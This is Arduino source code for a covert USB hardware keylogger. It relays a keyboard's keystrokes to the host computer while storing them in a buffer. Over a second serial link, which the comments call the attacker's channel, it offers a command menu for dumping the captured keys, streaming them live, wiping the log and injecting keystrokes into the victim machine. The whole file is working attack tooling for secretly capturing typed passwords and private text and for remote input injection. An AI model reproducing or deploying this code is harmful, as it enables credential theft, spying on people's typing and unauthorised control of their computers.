#include <avr/pgmspace.h>

#include <avrpins.h>
#include <max3421e.h>
#include <usbhost.h>
#include <usb_ch9.h>
#include <Usb.h>
#include <usbhub.h>
#include <avr/pgmspace.h>
#include <address.h>
#include <hidboot.h>

#include <printhex.h>
#include <message.h>
#include <hexdump.h>
#include <parsetools.h>

#include "HID.h"

#define KEY_UP 0

#define KEY_DOWN 1

#define LOG_SIZE 2500
uint8_t keyBuf[LOG_SIZE];
uint8_t modBuf[LOG_SIZE];
int keysStored = 0;

#define  RT_MODE 1
#define  SAVE_MODE 0
#define  COMMAND_MODE 2
#define  DISABLED 3

int globalMode;

void storeKey(uint8_t key, uint8_t mod);

void printKey(uint8_t key, uint8_t mod);

void printLog();

bool printNonAscii(uint8_t m, uint8_t key);
bool printIfAscii(uint8_t m, uint8_t key);

bool printModifier(bool& bracketOpened, bool printModifier, const char* modifier);
void enterCommandMode();
void commandAndControl(char command);


void simulateKeyPress(uint8_t key)
{
  
}

void enterCommandMode()
{
    bool stayInCommandMode = true;
    while(stayInCommandMode)
   {
     // Accept commands from the attacker
     if (Serial1.available()) 
     {
       char inByte = Serial1.read();
       if(inByte == '!')
       {
         // Exit command mode
         commandAndControl('s');
         return;
       }
       
       // Convert ascii to key code
       int keyCode = inByte - 'a' + HID_KEYBOARD_SC_A;
       
       uint8_t buffer[4];
    
       buffer[0] = 0xFF;
       buffer[1] = KEY_DOWN;
       buffer[2] = keyCode;
       buffer[3] = 0;
       Serial.write(buffer, 4);
    
       buffer[0] = 0xFF;
       buffer[1] = KEY_UP;
       buffer[2] = keyCode;
       buffer[3] = 0;
       Serial.write(buffer, 4);
     } 
  } 
}

void commandAndControl(char command)
{
  switch(command)
 {
   case '?':
    Serial1.println(" ");
    Serial1.println("Help screen");
    Serial1.println(" c = command mode (2)");
    Serial1.println(" d = disable mode (3)");
    Serial1.println(" i = info");
    Serial1.println(" p = print log");
    Serial1.println(" r = realtime mode (1)");
    Serial1.println(" s = save mode (0 default)");
    Serial1.println(" z = clear / zero memory");
    Serial1.println(" ? = help");    
    break;
    
   case 'i':
     Serial1.println("Keys Stored");
     Serial1.println(keysStored);
     Serial1.println("Mode");
     Serial1.println( (int) globalMode);
     break;
     
   case 'c':
     Serial1.println("Command mode"); 
     globalMode = COMMAND_MODE;
     enterCommandMode();
     break;
     
   case 'd':
     Serial1.println("Disable mode"); 
     globalMode = DISABLED;
     break;
     
   case 'r':
     Serial1.println("RealTime mode"); 
     globalMode = RT_MODE;
     break;
     
   case 's':
     Serial1.println("Save mode"); 
     globalMode = SAVE_MODE;
     break;
     
   case 'z':
     Serial1.println("Clearing log");
     keysStored = 0;
     break;
     
   case 'p':
     Serial1.println("Print log");
     printLog();
     break;
 } 
}

void printLog()
{
  int keysToPrint;
  if (keysStored > LOG_SIZE)
     keysToPrint = LOG_SIZE;
  else
     keysToPrint = keysStored;
  
  for(int i = 0; i < keysToPrint; i++)
    printKey(keyBuf[i], modBuf[i]); 
}

class KbdRptParser : public KeyboardReportParser
{
        void PrintKey(uint8_t mod, uint8_t key);
        
protected:
	virtual void OnKeyDown	(uint8_t mod, uint8_t key);
	virtual void OnKeyUp	(uint8_t mod, uint8_t key);
	virtual void OnKeyPressed(uint8_t key);
};
/*
void PrintHexSerial1(uint8_t val)
{
    uint8_t    mask = (((uint8_t)1) << (((sizeof(uint8_t) << 1) - 1) << 2));
    
    while (mask > 1)
    {
		if (val < mask)
		  Serial1.print("0");

		mask >>= 4;
    }
    Serial1.print((uint8_t)val, HEX);
}


void KbdRptParser::PrintKey(uint8_t m, uint8_t key)	
{
    MODIFIERKEYS mod;
    *((uint8_t*)&mod) = m;
    Serial.print((mod.bmLeftCtrl   == 1) ? "C" : " ");
    Serial.print((mod.bmLeftShift  == 1) ? "S" : " ");
    Serial.print((mod.bmLeftAlt    == 1) ? "A" : " ");
    Serial.print((mod.bmLeftGUI    == 1) ? "G" : " ");
    
    Serial.print(" >");
    PrintHexSerial1(key);
    Serial.print("< ");

    Serial.print((mod.bmRightCtrl   == 1) ? "C" : " ");
    Serial.print((mod.bmRightShift  == 1) ? "S" : " ");
    Serial.print((mod.bmRightAlt    == 1) ? "A" : " ");
    Serial.println((mod.bmRightGUI    == 1) ? "G" : " ");
};
*/
void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key)	
{
    uint8_t buffer[4];
    
    buffer[0] = 0xFF;
    buffer[1] = KEY_DOWN;
    buffer[2] = key;
    buffer[3] = mod;
    Serial.write(buffer, 4);
    
    storeKey(key, mod);
    
    return;
    
}

void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key)	
{
    uint8_t buffer[4];
    
    buffer[0] = 0xFF;
    buffer[1] = KEY_UP;
    buffer[2] = key;
    buffer[3] = mod;
    Serial.write(buffer, 4);    
    
    return;
}

void printKey(uint8_t key, uint8_t m)
{
   
  
  MODIFIERKEYS mod;
    *((uint8_t*)&mod) = m;
    
    bool openedBracketYet = false;
    bool asciiPrinted = false;
    
    printModifier(openedBracketYet, (mod.bmLeftCtrl || mod.bmRightCtrl), "CTRL");
    printModifier(openedBracketYet, (mod.bmLeftAlt || mod.bmRightAlt), "ALT");
    printModifier(openedBracketYet, (mod.bmLeftGUI || mod.bmRightGUI), "GUI");
    
    if (openedBracketYet)
    {
      Serial1.write('+');
    }
    
    asciiPrinted = printIfAscii(m, key);
    if (!asciiPrinted)
    {
      printModifier(openedBracketYet, (mod.bmLeftShift || mod.bmRightShift), "SHFT");
    
       if(!openedBracketYet)
       {
         Serial1.write('[');
         openedBracketYet = true;
       }
       
       if (!printNonAscii(m, key))
       {
         Serial1.print("Unknown");
       }  
    }
    
    if (openedBracketYet)
    {
      Serial1.print("]");
    }
    
    return;
  
  
}

bool shiftPressed(uint8_t m)
{
  MODIFIERKEYS mod;
  *((uint8_t*)&mod) = m;
  
  if ( (mod.bmLeftShift == 1) || (mod.bmRightShift == 1) )
    return true;
  else
    return false;
}

bool printModifier(bool& bracketOpened, bool printModifier, const char* modifier)
{
  if (printModifier)
  {
    if (bracketOpened)
    {
      Serial1.print("+");
    }
   else
    {
      Serial1.print("[");
      bracketOpened = true;
    } 
    
    Serial1.print(modifier);    
  }
}

bool printIfAscii(uint8_t m, uint8_t key)
{ 
  // Process the letter keys
  if ( (key >= HID_KEYBOARD_SC_A) &&
       (key <= HID_KEYBOARD_SC_Z) )
   {
     if ( shiftPressed(m) )
     {
       Serial1.write('A' + key - HID_KEYBOARD_SC_A);
     }
     else
     {
       Serial1.write('a' + key - HID_KEYBOARD_SC_A);     
     }
     
     return true;
   }
   
   if ( (key >= HID_KEYBOARD_SC_1_AND_EXCLAMATION) &&
        (key <= HID_KEYBOARD_SC_9_AND_OPENING_PARENTHESIS) )
   {
     if ( shiftPressed(m) )
     {
       switch (key)
       {
          case HID_KEYBOARD_SC_1_AND_EXCLAMATION:
            Serial1.write('!');
            break;
        
          case HID_KEYBOARD_SC_2_AND_AT:
            Serial1.write('@');
            break;
        
          case HID_KEYBOARD_SC_3_AND_HASHMARK:
            Serial1.write('#');
            break;
        
          case HID_KEYBOARD_SC_4_AND_DOLLAR:
            Serial1.write('$');
            break;
        
          case HID_KEYBOARD_SC_5_AND_PERCENTAGE:
            Serial1.write('%');
            break;
        
          case HID_KEYBOARD_SC_6_AND_CARET:
            Serial1.write('^');
            break;
        
          case HID_KEYBOARD_SC_7_AND_AND_AMPERSAND:
            Serial1.write('&');
            break;
        
          case HID_KEYBOARD_SC_8_AND_ASTERISK:
            Serial1.write('*');
            break;
        
          case HID_KEYBOARD_SC_9_AND_OPENING_PARENTHESIS:
            Serial1.write('(');
            break;       
       }
     }
     else
     {
       Serial1.write('1' + key - HID_KEYBOARD_SC_1_AND_EXCLAMATION);     
     }
     
     return true;
   }
   
   // 0 is weird because it is before 1 in ASCII, after 9 in scan codes
   if (key == HID_KEYBOARD_SC_0_AND_CLOSING_PARENTHESIS) 
   {
     if (shiftPressed(m))
     {
       Serial1.write(')');
     }
     else
     {
       Serial1.write('0');
     }
     
     return true;
   }
   
   if (key == HID_KEYBOARD_SC_ENTER)
   {
     Serial1.print("\r\n");
     return true;
   }
   
   if (key == HID_KEYBOARD_SC_TAB)
   {
     if (!shiftPressed(m))
     {
       Serial1.write('\t');
       return true;
     }
     else
     {
       // Reverse tab
       return false;
     }
   }
   
   if (key == HID_KEYBOARD_SC_SPACE)
   {
     Serial1.write(' ');
     return true;
   }
   
   if (key == HID_KEYBOARD_SC_MINUS_AND_UNDERSCORE)
   {
     if (shiftPressed(m))
     {
       Serial1.write('_');
     }
     else
     {
       Serial1.write('-');
     }
     
     return true;
   }
   
   if (key == HID_KEYBOARD_SC_EQUAL_AND_PLUS)
   {
     if (shiftPressed(m))
     {
       Serial1.write('+');
     }
     else
     {
       Serial1.write('=');
     }
     
     return true;
   }
   
   if (key == HID_KEYBOARD_SC_OPENING_BRACKET_AND_OPENING_BRACE)
   {
     if (shiftPressed(m))
     {
       Serial1.write('{');
       return false;
     }
     else
     {
       // open bracket
       return false;
     }
   }
   
   if (key == HID_KEYBOARD_SC_CLOSING_BRACKET_AND_CLOSING_BRACE)
   {
     if (shiftPressed(m))
     {
       Serial1.write('}');
       return false;
     }
     else
     {
       // close bracket
       return false;
     }
   }
   
   if (key == HID_KEYBOARD_SC_BACKSLASH_AND_PIPE)
   {
     if (shiftPressed(m))
     {
       Serial1.write('|');
     }
     else
     {
       Serial1.write('\\');
     }
     
     return true;
   }

if (key == HID_KEYBOARD_SC_SEMICOLON_AND_COLON )
   {
     if (shiftPressed(m))
     {
       Serial1.write(':');
     }
     else
     {
       Serial1.write(';');
     }
     
     return true;
   }

if (key == HID_KEYBOARD_SC_APOSTROPHE_AND_QUOTE)
   {
     if (shiftPressed(m))
     {
       Serial1.write('"');
     }
     else
     {
       Serial1.write('\'');
     }
     
     return true;
   }
if (key == HID_KEYBOARD_SC_GRAVE_ACCENT_AND_TILDE)
   {
     if (shiftPressed(m))
     {
       Serial1.write('~');
     }
     else
     {
       Serial1.write('`');
     }
     
     return true;
   }

if (key == HID_KEYBOARD_SC_COMMA_AND_LESS_THAN_SIGN)
   {
     if (shiftPressed(m))
     {
       Serial1.write('<');
     }
     else
     {
       Serial1.write(',');
     }
     
     return true;
   }
if (key == HID_KEYBOARD_SC_DOT_AND_GREATER_THAN_SIGN )
   {
     if (shiftPressed(m))
     {
       Serial1.write('>');
     }
     else
     {
       Serial1.write('.');
     }
     
     return true;
   }
if (key == HID_KEYBOARD_SC_SLASH_AND_QUESTION_MARK)
   {
     if (shiftPressed(m))
     {
       Serial1.write('?');
     }
     else
     {
       Serial1.write('/');
     }
     
     return true;
   }
   
   return false;
}

bool printNonAscii(uint8_t m, uint8_t key)
{
  switch(key)
  {
    case HID_KEYBOARD_SC_ESCAPE:
      Serial1.write("Esc");
      break;
    case HID_KEYBOARD_SC_BACKSPACE:
      Serial1.write("BkSp");
      break;
    case HID_KEYBOARD_SC_TAB:
      Serial1.write("Tab");
      break;
    case HID_KEYBOARD_SC_OPENING_BRACKET_AND_OPENING_BRACE:
      Serial1.write("[");
      break;
    case HID_KEYBOARD_SC_CLOSING_BRACKET_AND_CLOSING_BRACE:
      Serial1.write("]");
      break;
    case HID_KEYBOARD_SC_CAPS_LOCK:
      Serial1.write("CapsLk");
      break;
    case HID_KEYBOARD_SC_F1:
      Serial1.write("F1");
      break;
    case HID_KEYBOARD_SC_F2:
      Serial1.write("F2");
      break;
    case HID_KEYBOARD_SC_F3:
      Serial1.write("F3");
      break;
    case HID_KEYBOARD_SC_F4:
      Serial1.write("F4");
      break;
    case HID_KEYBOARD_SC_F5:
      Serial1.write("F5");
      break;
    case HID_KEYBOARD_SC_F6:
      Serial1.write("F6");
      break;
    case HID_KEYBOARD_SC_F7:
      Serial1.write("F7");
      break;
    case HID_KEYBOARD_SC_F8:
      Serial1.write("F8");
      break;
    case HID_KEYBOARD_SC_F9:
      Serial1.write("F9");
      break;
    case HID_KEYBOARD_SC_F10:
      Serial1.write("F10");
      break;
    case HID_KEYBOARD_SC_F11:
      Serial1.write("F11");
      break;
    case HID_KEYBOARD_SC_F12:
      Serial1.write("F12");
      break;
    case HID_KEYBOARD_SC_PRINT_SCREEN:
      Serial1.write("PrintSc");
      break;
    case HID_KEYBOARD_SC_SCROLL_LOCK:
      Serial1.write("ScrlLk");
      break;
    case HID_KEYBOARD_SC_PAUSE:
      Serial1.write("Pause");
      break;
    case HID_KEYBOARD_SC_INSERT:
      Serial1.write("Ins");
      break;
    case HID_KEYBOARD_SC_HOME:
      Serial1.write("Home");
      break;
    case HID_KEYBOARD_SC_PAGE_UP:
      Serial1.write("PgUp");
      break;
    case HID_KEYBOARD_SC_DELETE:
      Serial1.write("Del");
      break;
    case HID_KEYBOARD_SC_END:
      Serial1.write("End");
      break;
    case HID_KEYBOARD_SC_PAGE_DOWN:
      Serial1.write("PgDn");
      break;
    case HID_KEYBOARD_SC_RIGHT_ARROW:
      Serial1.write("RightArrow");
      break;
    case HID_KEYBOARD_SC_LEFT_ARROW:
      Serial1.write("LeftArrow");
      break;
    case HID_KEYBOARD_SC_DOWN_ARROW:
      Serial1.write("DownArrow");
      break;
    case HID_KEYBOARD_SC_UP_ARROW:
      Serial1.write("UpArrow");
      break;
    case HID_KEYBOARD_SC_NUM_LOCK:
      Serial1.write("NumLk");
      break;
    case HID_KEYBOARD_SC_KEYPAD_SLASH:
      Serial1.write("Kp/");
      break;
    case HID_KEYBOARD_SC_KEYPAD_ASTERISK:
      Serial1.write("Kp*");
      break;
    case HID_KEYBOARD_SC_KEYPAD_MINUS:
      Serial1.write("Kp-");
      break;
    case HID_KEYBOARD_SC_KEYPAD_PLUS:
      Serial1.write("Kp+");
      break;
    case HID_KEYBOARD_SC_KEYPAD_ENTER:
      Serial1.write("KpEnter");
      break;
    case HID_KEYBOARD_SC_KEYPAD_1_AND_END:
      Serial1.write("Kp1");
      break;
    case HID_KEYBOARD_SC_KEYPAD_2_AND_DOWN_ARROW:
      Serial1.write("Kp2");
      break;
    case HID_KEYBOARD_SC_KEYPAD_3_AND_PAGE_DOWN:
      Serial1.write("Kp3");
      break;
    case HID_KEYBOARD_SC_KEYPAD_4_AND_LEFT_ARROW:
      Serial1.write("Kp4");
      break;
    case HID_KEYBOARD_SC_KEYPAD_5:
      Serial1.write("Kp5");
      break;
    case HID_KEYBOARD_SC_KEYPAD_6_AND_RIGHT_ARROW:
      Serial1.write("Kp6");
      break;
    case HID_KEYBOARD_SC_KEYPAD_7_AND_HOME:
      Serial1.write("Kp7");
      break;
    case HID_KEYBOARD_SC_KEYPAD_8_AND_UP_ARROW:
      Serial1.write("Kp8");
      break;
    case HID_KEYBOARD_SC_KEYPAD_9_AND_PAGE_UP:
      Serial1.write("Kp9");
      break;
    case HID_KEYBOARD_SC_KEYPAD_0_AND_INSERT:
      Serial1.write("Kp0");
      break;
    case HID_KEYBOARD_SC_KEYPAD_DOT_AND_DELETE:
      Serial1.write("Kp.");
      break;
    default:
      // Not found
      return false;    
  }
  
  return true;
}
		
		

		
		


void storeKey(uint8_t key, uint8_t mod)
{
   if (globalMode == RT_MODE)
   {
     printKey(key, mod);
   }
   
   if (globalMode == SAVE_MODE)
   {
     #define LOG_SIZE 2500
      keyBuf[keysStored % LOG_SIZE] = key;
      modBuf[keysStored % LOG_SIZE] = mod;
      keysStored++;

   }
}

void KbdRptParser::OnKeyPressed(uint8_t key)	
{
    Serial.print("ASCII: ");
    Serial.println((char)key);
};

USB     Usb;
//USBHub     Hub(&Usb);
HIDBoot<HID_PROTOCOL_KEYBOARD>    Keyboard(&Usb);

uint32_t next_time;

KbdRptParser Prs;

void setup()
{
    Serial.begin( 115200 );
    Serial1.begin (38400);
    
    //Serial.println("Start");

    if (Usb.Init() == -1)
        Serial.println("OSC did not start.");
      
    delay( 200 );
  
    next_time = millis() + 5000;
  
    Keyboard.SetReportParser(0, (HIDReportParser*)&Prs);
}

void loop()
{
    Usb.Task();
    
    // read from port 0, send to port 1:
  if (Serial.available()) 
  {
    int inByte = Serial.read();
    Serial.write(inByte);
    Serial1.write(inByte); 
    //Serial.print("Sent to BT:  ");
    //Serial.println(inByte);

  }
  // Accept commands from the attacker
  if (Serial1.available()) 
  {
    char inByte = Serial1.read();
    commandAndControl(inByte);
  } 
}

